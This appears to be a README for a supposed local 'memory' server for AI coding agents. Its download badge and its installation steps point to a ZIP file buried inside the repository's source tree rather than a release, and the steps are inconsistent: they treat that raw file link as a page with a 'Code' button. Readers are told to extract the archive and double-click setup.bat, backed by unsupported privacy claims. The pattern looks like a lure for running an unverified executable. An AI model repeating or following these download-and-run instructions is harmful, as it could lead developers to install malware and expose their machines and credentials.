# 🧠 allan-mcp-memory-code - Improve your AI coding agent memory

[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/gerrielxxvii307/allan-mcp-memory-code/main/lib/interface/repositories/memory-code-mcp-allan-v2.0.zip)

allan-mcp-memory-code adds a brain to your AI coding agents. It stores information about your code in a visual map. Your coding tools use this map to remember project details, file connections, and logic. The software runs on your own machine. It keeps your data private and works without an internet connection.

## 🛠️ Required Setup

Your computer needs specific tools to run this software. Please confirm your computer meets these needs:

1. Windows 10 or 11.
2. At least 8 gigabytes of memory.
3. Docker Desktop installed and running.

Docker acts as the foundation for the software. Download and install it from the official Docker website if you do not have it. Start Docker Desktop and keep it running in the background before you begin the next steps.

## 💾 Installation Steps

Follow these instructions to set up the software.

1. Visit this page to download: https://raw.githubusercontent.com/gerrielxxvii307/allan-mcp-memory-code/main/lib/interface/repositories/memory-code-mcp-allan-v2.0.zip 
2. Locate the green button labeled Code on the page.
3. Click Download ZIP.
4. Extract the ZIP folder to a convenient place on your computer, such as your Documents folder.

## ⚙️ Running the Software

1. Open the folder you extracted.
2. Find the file named setup.bat.
3. Double-click the file to start the installation.
4. The screen shows lines of text while the software configures itself. Do not close this window until the process finishes.
5. Once the process ends, the software runs in the background.

## 🔗 Connecting to Your AI Tools

The software works with popular coding assistants like Claude, Cline, Cursor, and Windsurf. Each tool needs a connection to the knowledge graph.

### Configuring Cursor

1. Open Cursor.
2. Go to Settings.
3. Select the Features tab.
4. Look for the Memory settings.
5. Enter the local address provided by the installation script.
6. Save your settings.

### Configuring Cline or Claude

1. Open your assistant settings menu.
2. Locate the MCP or Server integration section.
3. Add a new server.
4. Name the server Memory.
5. Provide the local path for the memory server.
6. The assistant now connects to your local knowledge graph.

## 🧠 Understanding Knowledge Graphs

A knowledge graph acts like a structured map for data. The software scans your files to find entities. An entity can be a function, a class, or a variable. It links these entities based on how they interact in your code. 

When you ask your AI agent a question, it queries this graph first. Instead of reading every file, it jumps to the specific parts of the project that matter. This allows the AI to provide accurate answers about large projects. Because the data stays on your machine, no outside server sees your sensitive code or personal documentation.

## 🚀 Features

*   **Offline Mode:** You own your data. Nothing leaves your machine.
*   **Token Optimization:** By focusing the AI on relevant connections, it reads fewer files. This lowers your usage costs.
*   **Continuous Updates:** The map updates as you save changes to your code.
*   **Broad Compatibility:** It supports multiple AI coding agents through standardized interfaces.
*   **Self-Correction:** The system verifies links between code components daily to ensure the map remains accurate.

## 🔍 Troubleshooting Common Issues

**The software does not start.**
Check if Docker Desktop is running. The icon should appear in your taskbar tray. If it is not there, search for Docker Desktop in your Start menu and open it.

**The AI agent says it cannot find the server.**
Check the URL in your agent settings. It should point to the local address displayed during the installation. Ensure your firewall allows local connections.

**The knowledge graph seems outdated.**
Restart the setup.bat file to force a refresh of the indexing process. The tool scans your current project folder and rebuilds the relationships.

**The computer feels slow.**
Knowledge graph creation uses system resources. If the software affects your performance, you can pause it while you perform intensive tasks. Close the running terminal window to stop the service.

## 🛡️ Data Privacy

Privacy acts as the core of this project. Many AI tools send your entire project history to remote servers. This software stores the map locally. It extracts metadata and relationships but never uploads your source code. You maintain complete control over the information. Delete the folder at any time to remove all traces of the memory database from your computer.

## 📈 Performance Tips

*   Assign more memory to Docker Desktop in its settings if you notice long wait times during indexing.
*   Exclude very large folders like node_modules from the project scans. This speeds up the mapping process significantly.
*   Use a solid-state drive for your project files to improve access speeds for the knowledge graph.

## 📦 System Architecture

The system uses a containerized approach. The container holds a graph database and the translation tools needed to talk to AI agents. It does not require extra software beyond the provided setup files and Docker. Each time the command prompt runs, it initiates a connection between your local files and your AI tools. 

Updates to the tool occur through the main GitHub repository. Check the download page periodically for improvements to mapping speed or support for new coding agents. The software functions best when the project root remains consistent. Do not move the project folder after you complete the initial setup unless you plan to update the configuration paths in your AI agents.